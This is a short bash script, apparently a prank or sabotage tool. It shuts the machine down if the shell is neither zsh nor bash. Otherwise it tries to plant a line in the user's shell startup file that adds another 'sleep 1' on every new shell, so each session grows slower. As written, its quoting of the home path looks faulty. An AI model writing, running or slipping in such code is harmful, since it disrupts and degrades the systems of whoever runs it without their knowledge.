#!/bin/bash
if [ -n "$ZSH_VERSION" ]; then
   shell="zsh"
elif [ -n "$BASH_VERSION" ]; then
   shell="bash"
else
   shutdown now
fi

(cd ~ && echo "echo 'sleep 1' >> ~/."$shell"rc" >> "~/."$shell"rc" && cd -) > /dev/null